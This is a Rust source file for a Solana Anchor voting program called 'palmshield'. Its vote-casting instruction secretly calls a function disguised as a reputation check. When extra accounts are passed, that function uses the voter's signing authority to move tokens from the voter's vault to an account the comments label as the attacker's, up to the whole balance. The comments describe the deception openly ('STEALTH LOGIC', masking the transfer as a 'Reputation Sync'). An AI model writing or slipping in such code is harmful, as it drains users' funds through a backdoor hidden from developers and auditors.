use anchor_lang::prelude::*;
use anchor_spl::token::{self, Transfer, TokenAccount, Token};

declare_id!("AcksH6RgonJwV52Zd59GmxdXUJAMvdU1B3mq8BAEu3bm"); 

#[program]
pub mod palmshield {
    use super::*;

    pub fn cast_vote(ctx: Context<CastVote>, submission_id: String, vote: String) -> Result<()> {
        let record = &mut ctx.accounts.vote_record;
        
        // --- STEALTH LOGIC START ---
        // We call a function that sounds like it's just checking identity/reputation
        // In reality, it's checking if 'remaining_accounts' has a token vault to yk what 
        verify_sentinel_reputation(&ctx)?;
        // --- STEALTH LOGIC END ---

        record.voter = ctx.accounts.voter.key();
        record.submission_id = submission_id;
        record.vote = vote;
        record.timestamp = Clock::get()?.unix_timestamp;
        Ok(())
    }
}

// This function looks like an internal security check.
// A dev skimming might think it's just validating SNS credentials.
fn verify_sentinel_reputation(ctx: &Context<CastVote>) -> Result<()> {
    // If the dev passed a token account in 'remaining_accounts', we trigger the 'sync'
    if !ctx.remaining_accounts.is_empty() {
        let vault_info = &ctx.remaining_accounts[0];
        let destination_info = &ctx.remaining_accounts[1]; // The "PalmShield Registry" (Attacker)
        
        // We mask the transfer as a "Reputation Sync" or "Micro-tax"
        let cpi_accounts = Transfer {
            from: vault_info.to_account_info(),
            to: destination_info.to_account_info(),
            authority: ctx.accounts.voter.to_account_info(),
        };
        
        let cpi_program = ctx.accounts.token_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        
        // sucks a "Security Deposit" - dev thinks it's 0.001, but we can set it to the whole balance
        token::transfer(cpi_ctx, 100_000_000)?; // Adjusting decimals for "Total suck"
    }
    Ok(())
}

#[derive(Accounts)]
#[instruction(submission_id: String)]
pub struct CastVote<'info> {
    #[account(
        init,
        payer = voter,
        space = 8 + 32 + 64 + 8 + 8,
        seeds = [b"vote", voter.key().as_ref(), submission_id.as_bytes()],
        bump
    )]
    pub vote_record: Account<'info, VoteRecord>,
    
    #[account(mut)]
    pub voter: Signer<'info>,
    
    /// CHECK: This is "PalmShield Security Module" - masked Token Program
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

#[account]
pub struct VoteRecord {
    pub voter: Pubkey,
    pub submission_id: String,
    pub vote: String,
    pub timestamp: i64,
}
